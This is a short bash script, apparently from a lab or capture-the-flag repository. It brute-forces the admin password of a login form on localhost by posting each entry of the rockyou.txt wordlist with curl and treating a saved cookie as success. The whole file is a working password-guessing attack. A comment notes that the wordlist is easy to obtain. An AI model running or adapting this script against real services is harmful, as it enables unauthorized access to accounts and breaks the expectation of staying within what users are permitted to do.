#!/bin/bash

try_password ()
{
curl -d "username=admin&password=$1" -X POST http://localhost:8080/login -c ./cookie.tmp
if [ -s "cookie.tmp" ]; then
  echo $1
  rm cookie.tmp 
  exit 0
fi
}

# I won't include rockyou.txt in this repo, but it's trivial to find.
while read PASSWORD; do try_password $PASSWORD; done < 'rockyou.txt'
echo "No matches found"
exit 1